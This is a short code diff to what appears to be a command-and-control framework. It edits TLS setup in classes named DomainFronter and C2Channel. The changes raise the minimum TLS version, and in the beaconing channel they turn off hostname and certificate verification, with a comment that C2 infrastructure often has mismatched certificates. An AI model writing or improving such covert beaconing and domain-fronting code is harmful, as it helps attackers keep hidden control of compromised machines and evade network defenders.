@@ -281,12 +281,15 @@ class DomainFronter:
             
             # Create SSL context
             # Create SSL context (Hardened)
+            # Create SSL context (Strategic Hardened TLS 1.2+)
+            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            context.minimum_version = ssl.TLSVersion.TLSv1_2
+            
             if self.verify_ssl:
-                context = ssl.create_default_context()
+                context.load_default_certs()
                 context.check_hostname = True
                 context.verify_mode = ssl.CERT_REQUIRED
             else:
-                context = ssl.create_default_context()
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
             
@@ -772,7 +775,10 @@ class C2Channel:
                 method="POST"
             )
             
-            context = ssl.create_default_context()
+            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            context.minimum_version = ssl.TLSVersion.TLSv1_2
+            # Beaconing often uses infrastructure with non-matching certs, 
+            # but we still want encrypted channel.
             context.check_hostname = False
             context.verify_mode = ssl.CERT_NONE
             
